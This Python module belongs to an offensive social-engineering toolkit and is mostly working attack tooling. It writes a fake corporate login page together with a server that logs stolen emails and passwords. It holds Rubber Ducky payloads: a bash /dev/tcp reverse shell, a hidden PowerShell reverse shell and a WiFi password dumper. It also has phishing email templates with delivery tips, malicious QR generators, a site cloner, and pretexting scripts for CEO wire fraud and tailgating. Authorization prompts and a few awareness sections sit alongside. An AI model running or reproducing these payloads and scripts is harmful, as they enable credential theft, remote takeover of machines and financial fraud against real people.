"""
Social Engineering Toolkit Module - Advanced Social Engineering
Phishing campaign generation, pretexting tools, credential harvesting, USB payload creation, and awareness training.
"""

import os
import time
import hashlib
import random
import string
from modules.utils import (
    run_command, check_tool, check_root, require_root,
    print_info, print_warning, print_error, print_status,
    print_section, print_banner, get_user_input, confirm_action,
    display_menu, Colors
)


def social_engineering():
    """Social Engineering Toolkit."""
    while True:
        choice = display_menu("Social Engineering Toolkit", [
            "Phishing email generator",
            "Credential harvesting page",
            "USB rubber ducky payload creator",
            "QR code attack generator",
            "Pretexting script generator",
            "Spear phishing campaign planner",
            "Vishing (voice phishing) scripts",
            "Physical security checklist",
            "Awareness training report generator",
            "Clone website for testing",
            "Check SE tools",
        ], Colors.RED)
        if choice == 0: break
        elif choice == 1: _phishing_email()
        elif choice == 2: _credential_harvest()
        elif choice == 3: _usb_payload()
        elif choice == 4: _qr_attack()
        elif choice == 5: _pretexting()
        elif choice == 6: _spearphish_campaign()
        elif choice == 7: _vishing_scripts()
        elif choice == 8: _physical_security()
        elif choice == 9: _awareness_report()
        elif choice == 10: _clone_website()
        elif choice == 11: _check_se_tools()


def _phishing_email():
    """Generate phishing email templates for authorized testing."""
    print_warning("FOR AUTHORIZED SECURITY TESTING ONLY!")
    if not confirm_action("Do you have written authorization for phishing testing?"):
        return
    sub = display_menu("Phishing Template", [
        "Password reset (generic)",
        "IT support / helpdesk",
        "Invoice / payment",
        "Shared document notification",
        "Account suspension warning",
        "Custom template",
    ], Colors.RED)
    if sub == 0: return
    company = get_user_input("Target company name", "Acme Corp")
    sender_name = get_user_input("Sender display name", "IT Security Team")
    target_name = get_user_input("Target's name", "Employee")
    link = get_user_input("Phishing link URL", "https://your-phishing-server.com/login")
    templates = {
        1: {
            "subject": "Urgent: Password Expires in 24 Hours - %s" % company,
            "body": """Dear %s,

Your %s network password will expire in 24 hours. To avoid losing access to your email and company resources, please update your password immediately.

Click here to update your password:
%s

If you do not update your password by tomorrow, your account will be temporarily locked and you will need to contact the IT helpdesk to regain access.

Thank you,
%s
%s IT Department
""" % (target_name, company, link, sender_name, company),
        },
        2: {
            "subject": "[%s IT Support] Your account requires verification" % company,
            "body": """Hi %s,

We've detected unusual login activity on your %s account. As a security precaution, we need you to verify your identity.

Please click the link below to verify your account:
%s

If you did not attempt to log in, please verify immediately to secure your account.

Best regards,
%s
%s IT Support
Ticket #%d
""" % (target_name, company, link, sender_name, company, random.randint(10000, 99999)),
        },
        3: {
            "subject": "Invoice #%d - Payment Required" % random.randint(100000, 999999),
            "body": """Dear %s,

Please find attached the invoice for services rendered. Payment is due within 5 business days.

View and pay invoice:
%s

Amount: $%d.%02d
Due date: %s

If you have any questions regarding this invoice, please reply to this email.

Regards,
%s
Accounts Receivable
""" % (target_name, link, random.randint(500, 15000), random.randint(0, 99),
       time.strftime("%B %d, %Y", time.localtime(time.time() + 432000)), sender_name),
        },
        4: {
            "subject": "%s shared a document with you" % sender_name,
            "body": """Hi %s,

%s has shared a document with you on %s Cloud Drive.

Click to view: %s

Document: Q%d_Financial_Report.xlsx
Shared by: %s
Access: View & Edit

This link will expire in 7 days.

- %s Cloud Services
""" % (target_name, sender_name, company, link, random.randint(1, 4), sender_name, company),
        },
        5: {
            "subject": "ACTION REQUIRED: %s Account Suspension Notice" % company,
            "body": """IMPORTANT NOTICE

Dear %s,

We have detected a violation of %s's Acceptable Use Policy on your account. Your account will be suspended within 48 hours unless you verify your identity.

Verify your account now:
%s

Failure to verify will result in permanent account suspension and loss of all data.

%s Compliance Team
This is an automated message - do not reply directly.
""" % (target_name, company, link, company),
        },
    }
    if sub == 6:
        subject = get_user_input("Email subject")
        body = get_user_input("Email body (use {name}, {company}, {link} as placeholders)")
        body = body.replace("{name}", target_name).replace("{company}", company).replace("{link}", link)
        template = {"subject": subject, "body": body}
    else:
        template = templates.get(sub, templates[1])
    print_section("Generated Phishing Email")
    print_info("Subject: %s" % template["subject"])
    print_info("From: %s <%s-noreply@%s.com>" % (sender_name, company.lower().replace(" ", ""), company.lower().replace(" ", "")))
    print("")
    print(template["body"])
    # Save to file
    outfile = "/tmp/phishing_email_%d.txt" % int(time.time())
    with open(outfile, "w") as f:
        f.write("Subject: %s\n" % template["subject"])
        f.write("From: %s\n\n" % sender_name)
        f.write(template["body"])
    print_info("Saved to: %s" % outfile)
    # Effectiveness tips
    print_section("Effectiveness Tips")
    print_info("  - Send during business hours (Tue-Thu, 10am-2pm)")
    print_info("  - Use urgency but don't overdo it")
    print_info("  - Match company email formatting exactly")
    print_info("  - Register a lookalike domain (e.g. %s-secure.com)" % company.lower().replace(" ", ""))


def _credential_harvest():
    """Create a credential harvesting page for testing."""
    print_warning("FOR AUTHORIZED TESTING ONLY!")
    if not confirm_action("Authorization confirmed?"):
        return
    template = display_menu("Login Page Template", [
        "Generic corporate login",
        "Office 365 style",
        "Google Workspace style",
        "Custom login page",
    ], Colors.RED)
    company = get_user_input("Company name", "Acme Corp")
    port = get_user_input("Server port", "8443")
    outdir = "/tmp/harvest_%d" % int(time.time())
    run_command("mkdir -p %s" % outdir)
    if template == 1:
        bg_color = "#1a1a2e"
        accent = "#e94560"
    elif template == 2:
        bg_color = "#2f2f2f"
        accent = "#0078d4"
    elif template == 3:
        bg_color = "#ffffff"
        accent = "#4285f4"
    else:
        bg_color = get_user_input("Background color", "#1a1a2e")
        accent = get_user_input("Accent color", "#e94560")
    html = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:%s;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px;box-shadow:0 4px 24px rgba(0,0,0,0.15)}
.logo{text-align:center;margin-bottom:30px;font-size:24px;font-weight:700;color:#333}
.logo span{color:%s}
input{width:100%%;padding:12px 16px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:14px}
input:focus{border-color:%s;outline:none}
button{width:100%%;padding:12px;background:%s;color:#fff;border:none;border-radius:4px;
font-size:16px;cursor:pointer;margin-top:16px}
button:hover{opacity:0.9}
.forgot{text-align:center;margin-top:16px}
.forgot a{color:%s;text-decoration:none;font-size:13px}
.error{color:#e74c3c;font-size:13px;display:none;margin-top:8px}
</style></head><body>
<div class="login-box">
<div class="logo"><span>%s</span> Portal</div>
<form id="loginForm" method="POST" action="/login">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<div class="error" id="error">Invalid credentials. Please try again.</div>
<button type="submit">Sign In</button>
</form>
<div class="forgot"><a href="#">Forgot password?</a> | <a href="#">Need help?</a></div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit',function(e){
e.preventDefault();
var d=new FormData(this);
fetch('/login',{method:'POST',body:d}).then(function(){
document.getElementById('error').style.display='block';
document.querySelector('input[name=password]').value='';
});
});
</script></body></html>""" % (company, bg_color, accent, accent, accent, accent, company)
    # Server-side capture script
    server_py = """#!/usr/bin/env python3
import http.server, urllib.parse, os, time, ssl
LOG = '%s/captured_creds.log'
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()
        with open('%s/index.html','rb') as f:
            self.wfile.write(f.read())
    def do_POST(self):
        length = int(self.headers.get('Content-Length',0))
        data = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(data)
        email = params.get('email',[''])[0]
        password = params.get('password',[''])[0]
        ts = time.strftime('%%Y-%%m-%%d %%H:%%M:%%S')
        ip = self.client_address[0]
        entry = '[%%s] IP:%%s Email:%%s Password:%%s\\n' %% (ts, ip, email, password)
        with open(LOG,'a') as f:
            f.write(entry)
        print('\\033[91m[CAPTURED]\\033[0m %%s' %% entry.strip())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')
os.chdir('%s')
srv = http.server.HTTPServer(('0.0.0.0',%s),Handler)
print('Credential harvester running on port %s')
print('Captured creds saved to: %%s' %% LOG)
srv.serve_forever()
""" % (outdir, outdir, outdir, port, port)
    with open("%s/index.html" % outdir, "w") as f:
        f.write(html)
    with open("%s/server.py" % outdir, "w") as f:
        f.write(server_py)
    print_section("Credential Harvester Created")
    print_info("Directory: %s" % outdir)
    print_info("Login page: %s/index.html" % outdir)
    print_info("Server: %s/server.py" % outdir)
    print_info("\nStart: python3 %s/server.py" % outdir)
    print_info("Captured creds saved to: %s/captured_creds.log" % outdir)
    if confirm_action("Start harvester now?"):
        print_status("Starting on port %s..." % port)
        run_command("python3 %s/server.py &" % outdir, timeout=3)
        print_info("Harvester running. Send target to: http://<your-ip>:%s" % port)


def _usb_payload():
    """Generate USB Rubber Ducky / BadUSB payloads."""
    print_warning("FOR AUTHORIZED PHYSICAL SECURITY TESTING ONLY!")
    if not confirm_action("Authorization confirmed?"):
        return
    sub = display_menu("USB Payload Type", [
        "Reverse shell (Linux)",
        "Reverse shell (Windows PowerShell)",
        "WiFi password harvester (Windows)",
        "Browser credential dump (Windows)",
        "Ransomware simulator (harmless demo)",
        "Custom DuckyScript",
    ], Colors.RED)
    if sub == 0: return
    if sub == 1:
        ip = get_user_input("Callback IP")
        port = get_user_input("Callback port", "4444")
        script = """REM Linux Reverse Shell - Rubber Ducky Payload
REM Opens terminal and runs reverse shell
DELAY 1000
GUI t
DELAY 500
STRING bash -i >& /dev/tcp/%s/%s 0>&1
ENTER
""" % (ip, port)
    elif sub == 2:
        ip = get_user_input("Callback IP")
        port = get_user_input("Callback port", "4444")
        script = """REM Windows PowerShell Reverse Shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
ENTER
""" % (ip, port)
    elif sub == 3:
        script = """REM WiFi Password Harvester - Dumps saved WiFi passwords
DELAY 1000
GUI r
DELAY 500
STRING cmd /k "netsh wlan show profiles | findstr /i profile > %%temp%%\\wifi.txt && for /f "tokens=2 delims=:" %%a in (%%temp%%\\wifi.txt) do netsh wlan show profile name=%%a key=clear >> %%temp%%\\wifi_passwords.txt && start %%temp%%\\wifi_passwords.txt"
ENTER
"""
    elif sub == 4:
        script = """REM Browser Credential Dump Info
REM NOTE: Modern browsers encrypt credentials
REM This opens credential manager
DELAY 1000
GUI r
DELAY 500
STRING control /name Microsoft.CredentialManager
ENTER
"""
    elif sub == 5:
        script = """REM Ransomware Simulator (HARMLESS - creates warning files only)
DELAY 1000
GUI r
DELAY 500
STRING cmd /k "echo YOUR FILES HAVE BEEN ENCRYPTED (THIS IS A SECURITY TEST) > %%USERPROFILE%%\\Desktop\\SECURITY_TEST_README.txt && start %%USERPROFILE%%\\Desktop\\SECURITY_TEST_README.txt"
ENTER
"""
    elif sub == 6:
        print_info("DuckyScript commands: DELAY, STRING, ENTER, GUI, ALT, CTRL, SHIFT, TAB")
        script = get_user_input("Enter DuckyScript payload")
        if not script:
            return
    print_section("Generated DuckyScript Payload")
    print(script)
    outfile = "/tmp/duckyscript_%d.txt" % int(time.time())
    with open(outfile, "w") as f:
        f.write(script)
    print_info("Saved to: %s" % outfile)
    print_info("\nTo use: Flash to Rubber Ducky with duckencoder.jar")
    print_info("Or use with O.MG Cable, Digispark, Teensy, etc.")
    if check_tool("duckencoder.jar"):
        binfile = outfile.replace(".txt", ".bin")
        run_command("java -jar duckencoder.jar -i %s -o %s" % (outfile, binfile))
        print_info("Compiled: %s" % binfile)


def _qr_attack():
    """Generate malicious QR codes for testing."""
    print_warning("FOR AUTHORIZED TESTING ONLY!")
    if not confirm_action("Authorization confirmed?"):
        return
    sub = display_menu("QR Attack Type", [
        "Phishing URL QR code",
        "WiFi auto-connect QR",
        "Malicious app download QR",
        "Contact card with payload",
    ], Colors.RED)
    if sub == 0: return
    if sub == 1:
        url = get_user_input("Phishing URL")
        data = url
    elif sub == 2:
        ssid = get_user_input("WiFi SSID")
        password = get_user_input("WiFi password", "")
        auth = get_user_input("Auth type (WPA/WEP/nopass)", "WPA")
        data = "WIFI:T:%s;S:%s;P:%s;;" % (auth, ssid, password)
    elif sub == 3:
        url = get_user_input("App download URL")
        data = url
    elif sub == 4:
        name = get_user_input("Name")
        phone = get_user_input("Phone")
        url = get_user_input("Malicious URL to embed")
        data = "BEGIN:VCARD\nVERSION:3.0\nN:%s\nTEL:%s\nURL:%s\nEND:VCARD" % (name, phone, url)
    else:
        return
    if check_tool("qrencode"):
        outfile = "/tmp/qr_attack_%d.png" % int(time.time())
        run_command("qrencode -o %s -s 10 '%s' 2>&1" % (outfile, data))
        print_info("QR code saved: %s" % outfile)
    else:
        print_info("Data to encode in QR:")
        print(data)
        print_info("\nGenerate at: https://www.qr-code-generator.com/")
        print_info("Or install: sudo apt install qrencode")


def _pretexting():
    """Generate pretexting scripts for social engineering."""
    print_warning("FOR AUTHORIZED TESTING ONLY!")
    sub = display_menu("Pretext Scenario", [
        "IT helpdesk / tech support",
        "New employee / intern",
        "Vendor / third party",
        "Executive impersonation",
        "Delivery / maintenance",
        "Custom scenario",
    ], Colors.RED)
    if sub == 0: return
    company = get_user_input("Target company", "Acme Corp")
    target_dept = get_user_input("Target department", "IT")
    scripts = {
        1: """PRETEXT: IT Helpdesk / Tech Support
=============================================
Scenario: Call target claiming to be from IT support.

Opening: "Hi, this is [Name] from the %s IT helpdesk. We're seeing some
unusual activity on your account and need to verify a few things."

Questions to ask:
1. "Can you confirm your employee ID and department?"
2. "When was the last time you changed your password?"
3. "Are you experiencing any issues with your computer right now?"
4. "I need to verify your credentials to check the logs - can you tell me your username?"
5. "I'm going to send you a link to reset your password for security - can you click it?"

Escalation: "If we don't resolve this in the next 30 minutes, we'll need to
temporarily disable your account as a security measure."

Goal: Obtain credentials or get target to click phishing link.
""" % company,
        2: """PRETEXT: New Employee / Intern
=============================================
Scenario: Pretend to be a new employee or intern.

Opening: "Hi! I'm [Name], I just started in %s this week. I'm having trouble
getting set up and my manager [Boss Name] said someone here might be able to help."

Questions to ask:
1. "I can't access the shared drive - what's the path?"
2. "What's the WiFi password? I can only get guest access."
3. "I need to install [software] - do you have the admin credentials?"
4. "Can I borrow your badge to get into the server room? I left mine at my desk."

Behavior: Be friendly, slightly confused, ask lots of questions.

Goal: Gain physical access, network credentials, or internal information.
""" % target_dept,
        3: """PRETEXT: Vendor / Third Party
=============================================
Scenario: Impersonate a vendor or service provider.

Opening: "Hi, I'm [Name] from [Vendor]. We have a scheduled maintenance window
for your %s systems and I need to verify a few things before we begin."

Questions to ask:
1. "Can you confirm the current version of [software] you're running?"
2. "I need VPN access to perform the maintenance - can you set up an account?"
3. "We need to update the service account credentials - what are the current ones?"
4. "Can you whitelist our IP range in your firewall?"

Props: Wear vendor-branded clothing, carry a laptop bag with vendor stickers.

Goal: Gain remote access, credentials, or firewall exceptions.
""" % company,
        4: """PRETEXT: Executive Impersonation (Whale Phishing)
=============================================
Scenario: Impersonate a C-level executive via email or phone.

Email approach: "I'm in a meeting and need this handled urgently. Please wire
$[amount] to the following account for the [deal name]. This is time-sensitive."

Phone approach: "This is [CEO Name]. I need you to process an urgent payment.
I'll send the details via email. This needs to stay confidential."

Urgency indicators:
- Mention being in an important meeting
- Stress confidentiality
- Set a tight deadline (end of business today)
- Reference real company events/deals if known

Goal: Trick finance team into unauthorized transfers or actions.
""",
        5: """PRETEXT: Delivery / Maintenance
=============================================
Scenario: Gain physical access by impersonating delivery or maintenance.

Delivery: Show up with a package or equipment. "I have a delivery for %s.
I need a signature and to drop this in the server room."

Maintenance: "I'm here for the scheduled HVAC/electrical inspection. Can someone
show me to the mechanical room?" (often near server rooms)

Props needed: Clipboard, uniform, tool belt, fake work order, hi-vis vest.

Tailgating: Wait by a secure door and follow someone in. Carry heavy boxes
so someone holds the door for you.

Goal: Physical access to restricted areas, plant rogue devices.
""" % company,
    }
    if sub == 6:
        scenario = get_user_input("Describe your custom scenario")
        print(scenario)
    else:
        script = scripts.get(sub, scripts[1])
        print_section("Pretexting Script")
        print(script)
        outfile = "/tmp/pretext_%d.txt" % int(time.time())
        with open(outfile, "w") as f:
            f.write(script)
        print_info("Saved to: %s" % outfile)


def _spearphish_campaign():
    """Plan a spear phishing campaign."""
    print_warning("FOR AUTHORIZED TESTING ONLY!")
    if not confirm_action("Authorization confirmed?"):
        return
    company = get_user_input("Target organization")
    num_targets = get_user_input("Number of targets", "10")
    duration = get_user_input("Campaign duration (days)", "5")
    print_section("Spear Phishing Campaign Plan: %s" % company)
    plan = """
SPEAR PHISHING CAMPAIGN PLAN
===============================
Organization: %s
Targets: %s users
Duration: %s days
Date: %s

PHASE 1: RECONNAISSANCE (Day 1)
- OSINT on target organization (LinkedIn, website, social media)
- Identify key employees and roles
- Map email naming convention (firstname.lastname@domain.com)
- Identify current events/projects at the company
- Tools: theHarvester, recon-ng, LinkedIn, Glassdoor

PHASE 2: INFRASTRUCTURE (Day 1-2)
- Register lookalike domain (%s-portal.com)
- Set up phishing server with credential harvester
- Configure SPF/DKIM/DMARC on sending domain
- Set up tracking pixel for email opens
- Test email delivery to personal test account

PHASE 3: CAMPAIGN EXECUTION (Day 2-4)
- Send Wave 1: IT/Password reset template (30%% of targets)
- Wait 24 hours, analyze results
- Send Wave 2: Document share template (40%% of targets)
- Wait 24 hours, analyze results
- Send Wave 3: Executive request template (30%% of targets)

PHASE 4: REPORTING (Day 5)
- Total emails sent: %s
- Click-through rate
- Credential submission rate
- Time to first click
- Department breakdown
- Recommendations for training

METRICS TO TRACK:
- Email open rate (tracking pixel)
- Link click rate (URL tracking)
- Credential submission rate
- Report rate (who reported the phishing?)
- Time metrics (fastest click, average time)
""" % (company, num_targets, duration, time.strftime("%Y-%m-%d"), company.lower().replace(" ", ""), num_targets)
    print(plan)
    outfile = "/tmp/campaign_plan_%d.txt" % int(time.time())
    with open(outfile, "w") as f:
        f.write(plan)
    print_info("Saved to: %s" % outfile)


def _vishing_scripts():
    """Generate vishing (voice phishing) scripts."""
    print_warning("FOR AUTHORIZED TESTING ONLY!")
    sub = display_menu("Vishing Scenario", [
        "Bank / financial institution",
        "IT support callback",
        "Government agency",
        "Prize / reward scam",
    ], Colors.RED)
    if sub == 0: return
    scripts = {
        1: """VISHING SCRIPT: Bank Call
===========================
"Hello, this is [Name] calling from [Bank Name]'s fraud department.
We've detected suspicious activity on your account ending in XXXX.

We need to verify your identity to protect your account:
- Can you confirm your date of birth?
- Can you verify the last 4 digits of your SSN?
- I'll need you to verify a code we send to your phone.

If you don't verify now, we'll need to freeze the account for your protection."

RED FLAGS TO TEACH:
- Banks never ask for full SSN or password over phone
- They won't threaten to freeze immediately
- Caller ID can be spoofed
- Always hang up and call the number on your card
""",
        2: """VISHING SCRIPT: IT Support Callback
=====================================
"Hi [Name], this is [Tech] from IT returning your call about a computer issue.
Our system shows your workstation flagged a security alert.

I can help fix this remotely. I'll need you to:
1. Open your browser and go to [URL]
2. Download our remote support tool
3. Give me the session code so I can connect

This should only take a few minutes to resolve."

RED FLAGS TO TEACH:
- You didn't call IT
- Legitimate IT won't ask you to download random tools
- Verify by calling your IT helpdesk directly
""",
        3: """VISHING SCRIPT: Government Agency
====================================
"This is Officer [Name] from the [Agency]. We've identified a problem
with your [tax return / social security number / immigration status].

There is a warrant being prepared and you could face legal action.
However, this can be resolved immediately if you:
1. Verify your identity with your SSN
2. Make a payment of $[amount] to settle the fine
3. Payment can be made via gift card or wire transfer

Do NOT ignore this - failure to act will result in arrest."

RED FLAGS TO TEACH:
- Government agencies communicate by mail first
- They never demand gift cards or wire transfers
- They don't threaten immediate arrest over phone
- Hang up and call the agency's official number
""",
        4: """VISHING SCRIPT: Prize Scam
============================
"Congratulations! You've been selected as a winner in our [Brand] sweepstakes!
You've won $[amount] / a new [item]!

To claim your prize, we just need to verify a few details:
1. Full name and address for shipping
2. Date of birth for age verification
3. A small processing fee of $[amount] (payable by card)
4. Your bank details so we can deposit the winnings

This offer expires today, so we need to process this now."

RED FLAGS TO TEACH:
- You can't win a contest you didn't enter
- Legitimate prizes don't require payment
- Never give banking details to unsolicited callers
""",
    }
    script = scripts.get(sub, scripts[1])
    print_section("Vishing Script")
    print(script)


def _physical_security():
    """Physical security assessment checklist."""
    print_section("Physical Security Assessment Checklist")
    categories = {
        "Perimeter Security": [
            "Fencing condition and height",
            "Gate access controls (badge, code, guard)",
            "CCTV camera coverage and blind spots",
            "Lighting around building exterior",
            "Signage (authorized personnel only, etc.)",
            "Dumpster/trash security (shredding policy)",
        ],
        "Building Access": [
            "Badge/key card entry system",
            "Visitor sign-in process",
            "Tailgating prevention",
            "Guard presence and alertness",
            "After-hours access controls",
            "Loading dock security",
        ],
        "Internal Security": [
            "Server room access controls",
            "Clean desk policy enforcement",
            "Screen lock policy",
            "Unattended workstations",
            "USB port access (disabled?)",
            "Network jack access in public areas",
            "Printer/copier security",
        ],
        "Social Engineering Indicators": [
            "Employee willingness to hold doors",
            "Challenge of unknown persons",
            "Handling of suspicious packages",
            "Response to pretexting attempts",
            "Disposal of sensitive documents",
        ],
    }
    for cat, items in categories.items():
        print_section(cat)
        for item in items:
            print_info("  [ ] %s" % item)
    outfile = "/tmp/physical_security_checklist_%d.txt" % int(time.time())
    with open(outfile, "w") as f:
        f.write("PHYSICAL SECURITY ASSESSMENT CHECKLIST\n")
        f.write("Date: %s\n\n" % time.strftime("%Y-%m-%d"))
        for cat, items in categories.items():
            f.write("\n%s\n%s\n" % (cat, "=" * len(cat)))
            for item in items:
                f.write("  [ ] %s\n" % item)
    print_info("\nChecklist saved: %s" % outfile)


def _awareness_report():
    """Generate security awareness training report."""
    company = get_user_input("Company name", "Acme Corp")
    total_employees = get_user_input("Total employees tested", "100")
    clicked = get_user_input("Number who clicked phishing link", "23")
    submitted = get_user_input("Number who submitted credentials", "8")
    reported = get_user_input("Number who reported the phishing", "12")
    try:
        total = int(total_employees)
        click_n = int(clicked)
        submit_n = int(submitted)
        report_n = int(reported)
    except ValueError:
        total, click_n, submit_n, report_n = 100, 23, 8, 12
    click_rate = (click_n / total) * 100
    submit_rate = (submit_n / total) * 100
    report_rate = (report_n / total) * 100
    report_text = """
SECURITY AWARENESS ASSESSMENT REPORT
=======================================
Organization: %s
Date: %s
Assessor: Hat Program Security Assessment

EXECUTIVE SUMMARY
==================
A phishing simulation was conducted against %d employees to assess
the organization's susceptibility to social engineering attacks.

RESULTS
========
Total employees tested:     %d
Emails opened:              ~%d%% (estimated)
Clicked phishing link:      %d (%.1f%%)
Submitted credentials:      %d (%.1f%%)
Reported as phishing:       %d (%.1f%%)

RISK RATING: %s

FINDINGS
=========
1. %.1f%% of employees clicked a phishing link
   Industry average: 15-20%%
   Rating: %s

2. %.1f%% of employees submitted credentials
   Industry average: 3-5%%
   Rating: %s

3. %.1f%% of employees reported the phishing attempt
   Industry average: 5-10%%
   Rating: %s

RECOMMENDATIONS
================
1. Mandatory security awareness training for all employees
2. Implement phishing simulation program (quarterly)
3. Deploy email security gateway with URL analysis
4. Enable MFA on all accounts (reduces credential theft impact)
5. Create easy phishing report mechanism (button in email client)
6. Targeted training for employees who submitted credentials
7. Recognize and reward employees who reported the phishing

DEPARTMENT BREAKDOWN (if available):
- Finance:    High risk (handles wire transfers)
- Executive:  High risk (whale phishing targets)
- IT:         Medium risk (technical awareness)
- HR:         Medium risk (handles personal data)
- Operations: Standard risk
""" % (company, time.strftime("%Y-%m-%d"), total, total,
       int(click_rate * 1.5), click_n, click_rate, submit_n, submit_rate,
       report_n, report_rate,
       "HIGH" if submit_rate > 10 else "MEDIUM" if submit_rate > 3 else "LOW",
       click_rate, "POOR" if click_rate > 25 else "FAIR" if click_rate > 15 else "GOOD",
       submit_rate, "CRITICAL" if submit_rate > 10 else "POOR" if submit_rate > 5 else "FAIR",
       report_rate, "GOOD" if report_rate > 15 else "FAIR" if report_rate > 5 else "POOR")
    print(report_text)
    outfile = "/tmp/awareness_report_%d.txt" % int(time.time())
    with open(outfile, "w") as f:
        f.write(report_text)
    print_info("Report saved: %s" % outfile)


def _clone_website():
    """Clone a website for phishing testing."""
    print_warning("FOR AUTHORIZED TESTING ONLY!")
    if not confirm_action("Authorization confirmed?"):
        return
    url = get_user_input("Website URL to clone")
    if not url:
        return
    outdir = "/tmp/cloned_site_%d" % int(time.time())
    run_command("mkdir -p %s" % outdir)
    if check_tool("wget"):
        print_status("Cloning %s..." % url)
        stdout, stderr, rc = run_command(
            "wget -r -l 1 -p -k -P %s '%s' 2>&1 | tail -5" % (outdir, url), timeout=30)
        if stdout: print(stdout)
        if rc == 0:
            print_info("Site cloned to: %s" % outdir)
            print_info("Serve: cd %s && python3 -m http.server 8080" % outdir)
        else:
            print_error("Clone failed: %s" % stderr)
    elif check_tool("httrack"):
        stdout, _, _ = run_command("httrack '%s' -O %s -v 2>&1 | tail -5" % (url, outdir), timeout=60)
        if stdout: print(stdout)
    else:
        print_error("wget or httrack required.")
        print_info("Install: sudo apt install wget")


def _check_se_tools():
    """Check available social engineering tools."""
    print_section("Social Engineering Tool Availability")
    tools = {
        "setoolkit": "Social Engineering Toolkit (SET)",
        "gophish": "Phishing campaign manager",
        "king-phisher": "Phishing campaign toolkit",
        "evilginx2": "MITM phishing framework",
        "modlishka": "Reverse proxy phishing",
        "beef": "Browser Exploitation Framework",
        "wget": "Website cloner",
        "httrack": "Website copier",
        "qrencode": "QR code generator",
        "swaks": "SMTP test tool (send emails)",
        "sendemail": "Lightweight email sender",
        "theharvester": "Email/subdomain harvester",
        "maltego": "OSINT & link analysis",
        "recon-ng": "Recon framework",
    }
    available = []
    missing = []
    for tool, desc in tools.items():
        if check_tool(tool):
            print_info("  [+] %-16s - %s" % (tool, desc))
            available.append(tool)
        else:
            print_error("  [-] %-16s - %s" % (tool, desc))
            missing.append(tool)
    print_info("\nAvailable: %d/%d" % (len(available), len(tools)))
